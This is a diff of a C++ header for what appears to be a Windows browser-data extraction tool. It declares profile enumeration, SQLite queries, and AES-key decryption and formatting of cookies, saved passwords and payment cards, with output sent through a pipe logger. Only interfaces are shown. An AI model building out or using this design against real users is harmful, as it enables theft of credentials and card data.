@@ -5,12 +5,8 @@
 #include <Windows.h>
 #include <vector>
 #include <string>
-#include <filesystem>
-#include <memory>
-#include <unordered_map>
+#include <string_view>
 #include "winsqlite3.h"
-
-namespace fs = std::filesystem;
 
 namespace SecurityComponents
 {
@@ -21,41 +17,53 @@ namespace SecurityComponents
     {
         constexpr size_t COOKIE_PLAINTEXT_HEADER_SIZE = 32;
 
-        typedef std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>(*PreQuerySetupFunc)(sqlite3*);
-        typedef std::optional<std::string>(*JsonFormatterFunc)(sqlite3_stmt*, const std::vector<uint8_t>&, void*);
+        struct PaymentCard
+        {
+            std::string guid;
+            std::vector<uint8_t> value;
+        };
+
+        using PaymentCardTable = std::vector<PaymentCard>;
+        using PreQuerySetupFunc = bool (*)(sqlite3*, PaymentCardTable*);
+        using JsonFormatterFunc = bool (*)(sqlite3_stmt*, const std::vector<uint8_t>&,
+                                           void*, std::string&);
         
         struct ExtractionConfig
         {
-            fs::path dbRelativePath;
-            std::string outputFileName;
-            std::string sqlQuery;
+            const wchar_t* const* databasePaths;
+            std::size_t databaseCount;
+            const char* outputFileName;
+            const char* sqlQuery;
             PreQuerySetupFunc preQuerySetup;
             JsonFormatterFunc jsonFormatter;
         };
 
         // Pre-query setup function for payment cards
-        std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>> SetupPaymentCards(sqlite3* db);
+        bool SetupPaymentCards(sqlite3* db, PaymentCardTable* cards);
 
         // JSON formatters for different data types
-        std::optional<std::string> FormatCookie(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state);
-        std::optional<std::string> FormatPassword(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state);
-        std::optional<std::string> FormatPayment(sqlite3_stmt* stmt, const std::vector<uint8_t>& key, void* state);
+        bool FormatCookie(sqlite3_stmt* stmt, const std::vector<uint8_t>& key,
+                          void* state, std::string& entry);
+        bool FormatPassword(sqlite3_stmt* stmt, const std::vector<uint8_t>& key,
+                            void* state, std::string& entry);
+        bool FormatPayment(sqlite3_stmt* stmt, const std::vector<uint8_t>& key,
+                           void* state, std::string& entry);
 
         // Returns all extraction configurations
-        const std::vector<ExtractionConfig>& GetExtractionConfigs();
+        const ExtractionConfig* GetExtractionConfigs(std::size_t& count);
     }
 
     // Discovers all available browser profiles
     class ProfileEnumerator
     {
     public:
-        ProfileEnumerator(const fs::path& userDataRoot, PipeLogger& logger);
+        ProfileEnumerator(std::wstring userDataRoot, PipeLogger& logger);
         
         // Returns paths to all valid profile directories
-        std::vector<fs::path> FindProfiles();
+        std::vector<std::wstring> FindProfiles();
 
     private:
-        fs::path m_userDataRoot;
+        std::wstring m_userDataRoot;
         PipeLogger& m_logger;
     };
 
@@ -63,19 +71,19 @@ namespace SecurityComponents
     class DataExtractor
     {
     public:
-        DataExtractor(const fs::path& profilePath, const Data::ExtractionConfig& config,
+        DataExtractor(std::wstring profilePath, const Data::ExtractionConfig& config,
                       const std::vector<uint8_t>& aesKey, PipeLogger& logger,
-                      const fs::path& baseOutputPath, const std::string& browserName);
+                      std::wstring baseOutputPath, std::string browserName);
 
         // Performs extraction for configured data type
         void Extract();
 
     private:
-        fs::path m_profilePath;
+        std::wstring m_profilePath;
         const Data::ExtractionConfig& m_config;
         const std::vector<uint8_t>& m_aesKey;
         PipeLogger& m_logger;
-        fs::path m_baseOutputPath;
+        std::wstring m_baseOutputPath;
         std::string m_browserName;
     };
 }
